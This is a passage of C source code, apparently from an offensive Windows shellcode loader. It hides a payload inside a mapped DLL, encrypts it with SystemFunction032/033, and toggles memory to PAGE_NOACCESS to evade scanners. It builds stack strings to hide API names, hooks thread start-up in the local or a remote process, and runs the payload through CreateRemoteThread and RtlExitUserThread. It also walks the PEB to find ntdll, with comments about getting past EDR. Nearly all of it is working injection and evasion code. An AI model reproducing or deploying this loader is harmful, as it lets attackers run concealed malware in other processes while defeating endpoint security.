        // sysfunc32 = (SystemFunction032_t)GetProcAddress(LoadLibrary("advapi32.dll"), "SystemFunction032");
        NTSTATUS eny = sysfunc32(&pData, &pKey);
        if(eny != STATUS_SUCCESS) {
            printf("[-] sysfunc32 failed to encrypt the data. Status: %x\n", eny);
        } else {
            printf("[+] sysfunc32 succeeded to encrypt the data.\n");
        }
        // for (int i = 0; i < 16; i++) {
        //     r = rand();
        //     key[i] = (char) r;
        // }
        //print tyhe key value:
        // printf("[+] XOR key: ");
        // for (int i = 0; i < 16; i++) {
        //     printf("%02x", key[i]);
        // }
        // // encrypt the payload
        // sUrprise((char *)(LPVOID)baseAddress, magiccodeSize, key, sizeof(key));
        // printf("[+] Global dllEntryPoint memory encoded with XOR \n");
        // printf("[+] press any key to continue\n");
        // getchar();
    }
    ULONG Protect = PAGE_EXECUTE_READ;
    if(bUseNoAccess) {
        Protect = PAGE_NOACCESS;
    }

    

    status = NtProtectVirtualMemory(
        hProcess,
        &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
        &regionSize, // A pointer to the size of the region
        Protect, // The new protection attributes, PAGE_EXECUTE_READ
        // PAGE_EXECUTE_WRITECOPY, 
        &oldProtect); // The old protection attributes
    if(status != STATUS_SUCCESS) {
        printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
    } else {
        printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
    }
    //print both in hex and in string in one line:
    printf("[+] Original memory protection was: %s (0x%08X)\n", ProtectionToString(oldProtect), oldProtect);

    if(bUseNoAccess) {
        printf("\r\n [+] Real magiccode is NO ACCESS from now on. \r\n");    
        printf("[+] press any key to continue\n");
        getchar();  
    }


    const char getLib[] = { 'n', 't', 'd', 'l', 'l', 0 };

    if(bRemoteInjection) {



        // install hook
        printf("[!] Installing remote hook...\n\n");
        if(InstallHookRemote() != 0)
        {
            return 1;
        }

        printf("[+] press any key to continue\n");
        getchar();

        pRtlExitUserThread ExitThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");


        if(bUseNoAccess) {
            // // //change the memory protection back to PAGE_EXECUTE_READ:
            // status = NtProtectVirtualMemory(
            //     hProcess,
            //     &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
            //     &regionSize, // A pointer to the size of the region
            //     PAGE_READWRITE, // The new protection attributes, PAGE_EXECUTE_READ
            //     // PAGE_EXECUTE_WRITECOPY, 
            //     &oldProtect); // The old protection attributes
            // if(status != STATUS_SUCCESS) {
            //     printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            // } else {
            //     printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
            // }

            // /// restore the memory access and decrypt the payload.
            
            // // initialize_data((char*)dllEntryPoint, regionSize); 
            // // write stack string for SystemFunction033:
            // const char sysfunc33Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '3', 0 };
            // SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc33Char);
            // NTSTATUS eny = SystemFunction033(&pData, &pKey);
            // if(eny != STATUS_SUCCESS) {
            //     printf("[-] SystemFunction033 failed to encrypt the data. Status: %x\n", eny);
            // } else {
            //     printf("[+] SystemFunction033 succeeded to encrypt the data.\n");
            // }
            // // printf("[+] Restoring payload memory access and decrypting with XOR. \n");
            // // DWORD oldPal = 0;
            // // // Change the memory back to XR for execution...
            // // sUrprise((char *) dllEntryPoint, regionSize, key, sizeof(key));
        }



        // This part has been written into the pretext code, so that the memory guard is on until the last minute of execution.
        if(bUseNoAccess) {
            // //change the memory protection back to PAGE_EXECUTE_READ:
                status = NtProtectVirtualMemory(
                hProcess,
                &baseAddress, // NtProtectVirtualMemory expects a pointer to the base address
                &regionSize, // A pointer to the size of the region
                PAGE_EXECUTE_READ, // The new protection attributes, PAGE_EXECUTE_READ
                // PAGE_EXECUTE_WRITECOPY, 
                &oldProtect); // The old protection attributes
            if(status != STATUS_SUCCESS) {
                printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
            } else {
                printf("[+] Memory protection before change was: %s\n", ProtectionToString(oldProtect));
            }
        }

        // create a thread to call ExitThread, not hooked function:
        HANDLE hThread = NULL;
        DWORD threadId = 0;

        hThread = CreateRemoteThread(
                hProcess,          // Handle to the target process
                NULL,              // Default security attributes
                0,                 // Stack size (0 = default)
                (LPTHREAD_START_ROUTINE)ExitThread,  // Thread start routine (ExitThread)
                NULL,              // Thread parameter (None, since ExitThread takes no parameters)
                0,                 // Creation flags
                &threadId          // Thread ID
        );

        if (hThread == NULL) {
            printf("[-] Failed to create thread. Error: %x\n", GetLastError());
            return 1;
        } else {
            printf("[+] Thread created successfully.\n");
        } 

       // // use createRemoteThread to call a fake start address or any other functions: 
        // // We can put the thread in alterable state and ask it to have a start address at anywhere we like. 
        // HANDLE hThread = CreateRemoteThread(
        //     hProcess,                    // Handle to the remote process
        //     NULL,                        // No security attributes
        //     0,                           // Default stack size
        //     (LPTHREAD_START_ROUTINE)0x1337,  // Entry point of the remote DLL
        //     NULL,                        // No arguments to pass
        //     CREATE_SUSPENDED,                           // No special flags
        //     NULL                         // Don't need the thread ID
        // );

        // // if (hThread == NULL) {
        // //     printf("Failed to create remote thread. Error: %x\n", GetLastError());
        // //     return 1;
        // // } else { 
        // //     printf("[+] Remote thread created successfully at address: %p\n", dllEntryPoint);
        // // }

        /* Alternatively, we do not need to create any thread, the remote process application will trigger the execution for us
        if it performed any activities that use a basic function. */

        // Optionally, wait for the remote thread to finish execution
        WaitForSingleObject(hThread, INFINITE);


    } else {

        printf("[!] Installing local hook...\n\n");
        if(InstallHook() != 0)
        {
            printf("[-] Failed to install hook.\n");
        }
        

        pRtlExitUserThread ExitThread = (pRtlExitUserThread)dynamic::NotGetProcAddress(GetModuleHandle(getLib), "RtlExitUserThread");

        // create a thread to call ExitThread, not the DLL entrypoint that has our magic code:
        HANDLE hThread = NULL;
        DWORD threadId = 0;
        hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ExitThread, NULL, 0, &threadId);
        if (hThread == NULL) {
            printf("Failed to create thread. Error: %x\n", GetLastError());
            return 1;
        } else {
            printf("[+] RtlExitUserThread called successfully.\n");
            printf("[+] RtlExitUserThread will go through BaseThreadInitThunk\n");
        }
        // wait for 
        WaitForSingleObject(hThread, INFINITE);

        
        

    }

    // CloseHandle(hThread);
    // if(bUseLdrLoadDll) {
    //     UnmapViewOfFile(fileBase);
    // } else {
    //     UnmapViewOfFile(fileHandle);
    //     UnmapViewOfFile(fileBase);
    //     CloseHandle(hSection);
    // }
    return 0;


}



BOOL PrintSectionDetails(const wchar_t* dllPath) {
    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"Failed to open file %ls for section details. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* fileBuffer = (BYTE*)malloc(fileSize);
    if (!fileBuffer) {
        CloseHandle(hFile);
        wprintf(L"Memory allocation failed for reading file %ls.\n", dllPath);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        free(fileBuffer);
        CloseHandle(hFile);
        wprintf(L"Failed to read file %ls. Error: %lu\n", dllPath, GetLastError());
        return FALSE;
    }

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)fileBuffer;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(fileBuffer + dosHeader->e_lfanew);
    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Size of Image: 0x%X\n", ntHeaders->OptionalHeader.SizeOfImage); // Print Size of Image
    IMAGE_SECTION_HEADER* sectionHeaders = (IMAGE_SECTION_HEADER*)((BYTE*)ntHeaders + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders->FileHeader.SizeOfOptionalHeader);

    wprintf(L"Details for %ls:\n", dllPath);
    wprintf(L"  Number of sections: %d\n", ntHeaders->FileHeader.NumberOfSections);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER* section = &sectionHeaders[i];
        wprintf(L"  Section %d: %.*S\n", i + 1, IMAGE_SIZEOF_SHORT_NAME, section->Name);
        wprintf(L"    Virtual Size: 0x%X\n", section->Misc.VirtualSize);
        wprintf(L"    Virtual Address: 0x%X\n", section->VirtualAddress);
        wprintf(L"    Size of Raw Data: 0x%X\n", section->SizeOfRawData);
    }

    free(fileBuffer);
    CloseHandle(hFile);
    return TRUE;
}


// DWORD_PTR hooked_function() {
ULONG WINAPI hooked_function(DWORD LdrReserved, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter) {

    // // Buffer to store the message
    // char message[256];

    // // Format a message with the passed parameters
    // sprintf(message, "[+] LdrReserved: %lu\nStartAddress: %p\nParameter: %p", 
    //         LdrReserved, lpStartAddress, lpParameter);

    // // Display the message using MessageBox
    // MessageBoxA(NULL, message, "MyBaseThreadInitThunk", MB_OK);

    printf("[^_^] VMT hooked pointer called.\n");

    printf("[-_-] press any key to continue\n");
    getchar();

    ULONG oldProtect;

    NTSTATUS status;

    if(bUseNoAccess) {
        //change the memory protection to read write to decrypt the magiccode: 
            status = NtProtectVirtualMemory(
            hProcess,
            &dllEntryPoint,  
            &regionSize,  
            PAGE_READWRITE,  
            &oldProtect); 
        if(status != STATUS_SUCCESS) {
            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
        } else {
            printf("[+] Memory protection before this NtProtectVirtualMemory change was: %s\n", ProtectionToString(oldProtect));
        }


        // write stack string for SystemFunction033:
        const char sysfunc33Char[] = { 'S', 'y', 's', 't', 'e', 'm', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', '0', '3', '3', 0 };
        SystemFunction033 = (SystemFunction033_t)GetProcAddress(LoadLibrary("advapi32.dll"), sysfunc33Char);
        status = SystemFunction033(&pData, &pKey);
        if(status != STATUS_SUCCESS) {
            printf("[-] SystemFunction033 failed to decrypt the data. Status: %x\n", status);
        } else {
            printf("[+] SystemFunction033 succeeded to decrypt the data.\n");
        }
        printf("[+] Restoring payload memory access and decrypting\n");
        printf("[+] Restoring payload memory access and decrypting with XOR \n");
        // // Change the memory back to XR for execution...
        // sUrprise((char *) dllEntryPoint, magiccodeSize, key, sizeof(key));
    
        // // restore the VT pointer before execution:
        // *(DWORD_PTR*)pHookAddr = originalVtPtrValue; 

        // //change the memory protection back to PAGE_EXECUTE_READ:
        status = NtProtectVirtualMemory(
            hProcess,
            &dllEntryPoint,  
            &regionSize,  
            PAGE_EXECUTE_READ,  
            &oldProtect
        );  
        if(status != STATUS_SUCCESS) {
            printf("[-] NtProtectVirtualMemory failed to restore original memory protection. Status: %x\n", status);
        } else {
            printf("[+] Memory protection before this NtProtectVirtualMemory was: %s\n", ProtectionToString(oldProtect));
        }


    }

    // printf("[-_-] press any key to continue\n");
    // getchar();
    (*DllEntryGlobal)((HINSTANCE)fileBaseGlobal, DLL_PROCESS_ATTACH, 0); 

    // return 0;

}


ADDR *GetNtdllBase() {

    //1st method: 
    // void *ntdllBase = NULL;
    // PPEB_LDR_DATA ldr = NULL;
    // PPEB pPEB = NULL;

    /// get PEB: 
    // #ifdef _WIN64
    //     pPEB = (PPEB)__readgsqword(0x60); // Read PEB address from the GS segment register
    // #else
    //     pPEB = (PPEB)__readfsdword(0x30); // Read PEB address from the FS segment register
    // #endif

    // #ifdef _WIN64
    //     __asm__ volatile (
    //         "movq %%gs:0x60, %0" // Read PEB address from the GS segment register, PEB is pointed by a pointer at offset 0x60 to the TEB. 
    //         : "=r" (pPEB)
    //     );
    // #else
    //     __asm__ volatile (
    //         "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
    //         : "=r" (pPEB)
    //     );
    // #endif
    // // Walk PEB: 
    // DWORD64 qwNtdllBase = (DWORD64)pPEB->Ldr & ~(0x10000 - 1); //Align the Ldr addr to 64kb boundary. 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) { // contain valid DOS header? 
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {  //Valid NT header? 
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase); //First valid module is ntdll.dll
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000; //Windows loader aligns DLLs to 64kb boundary to simplify address space layout. 
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    //2nd: 
    // while (1) {
    //     IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)qwNtdllBase;
    //     if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
    //         IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)(qwNtdllBase + dosHeader->e_lfanew);
    //         if (ntHeaders->Signature == IMAGE_NT_SIGNATURE && ntHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    //             printf("[+] Ntdll base address found: %p\n", (void*)qwNtdllBase);
    //             return (ADDR*)qwNtdllBase;
    //         }
    //     }
    //     qwNtdllBase -= 0x10000;
    //     if (qwNtdllBase == 0) {
    //         printf("[-] Ntdll base address not found\n");
    //         return 0;
    //     }
    // }

    
    //2nd method: 
    void *ntdllBase = NULL;
    PPEB_LDR_DATA ldr = NULL;
    PPEB pPEB = NULL;
    PLDR_DATA_TABLE_ENTRY_FREE dte = NULL;

    #ifdef _WIN64
        __asm__ volatile (
            "movq %%gs:0x60, %0" // Read PEB address from the GS segment register
            : "=r" (pPEB)
        );
    #else
        __asm__ volatile (
            "movl %%fs:0x30, %0" // Read PEB address from the FS segment register
            : "=r" (pPEB)
        );
    #endif

    // Get PEB_LDR_DATA
    ldr = pPEB->Ldr;

    // // Iterate through InMemoryOrderModuleList to find ntdll.dll
    // LIST_ENTRY* head = &ldr->InMemoryOrderModuleList;
    // LIST_ENTRY* current = head->Flink;

    // while (current != head) {
    //     dte = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    //     // Print the base address and name of each module
    //     wprintf(L"Module: %ls, Base Address: %p\n", dte->BaseDllName.Buffer, dte->DllBase);

    //     // Check if the BaseDllName matches "ntdll.dll"
    //     if (wcscmp(dte->BaseDllName.Buffer, L"ntdll.dll") == 0) {
    //         ntdllBase = dte->DllBase;
    //         break;
    //     }

    //     current = current->Flink;
    // }

    // Get the 2nd entry in the InMemoryOrderModuleList, but if EDR injects fake DLL, it will not be the 2nd entry.

    // Get the first entry (the application itself)
    LIST_ENTRY* firstEntry = ldr->InMemoryOrderModuleList.Flink;
    // Get the second entry (ntdll.dll)
    LIST_ENTRY* secondEntry = firstEntry->Flink;

    // Get the LDR_DATA_TABLE_ENTRY_FREE for ntdll.dll
    dte = CONTAINING_RECORD(secondEntry, LDR_DATA_TABLE_ENTRY_FREE, InMemoryOrderLinks);

    ntdllBase = dte->DllBase;

    // /// OR check the string name of the module:
    // LIST_ENTRY* current = Ldr->InMemoryOrderModuleList; // Get the first entry in the list of loaded modules
    // do {
    //     current = current->Flink; // Move to the next entry
    //     MY_LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(current, MY_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    //     char dllName[256]; // Buffer to store the name of the DLL
    //     snprintf(dllName, sizeof(dllName), "%wZ", entry->FullDllName);
    //     if (strstr(dllName, "ntdll.dll")) { // Check if dllName contains "ntdll.dll"
    //         return entry->DllBase; // Return the base address of ntdll.dll
    //     }
    // } while (current != Ldr->InMemoryOrderModuleList); // Loop until we reach the first entry again


    if (ntdllBase != NULL) {
        printf("[+] Ntdll base address found: %p\n", ntdllBase);
    } else {
        printf("[-] Ntdll base address not found\n");
    }

    return (ADDR*)ntdllBase;
}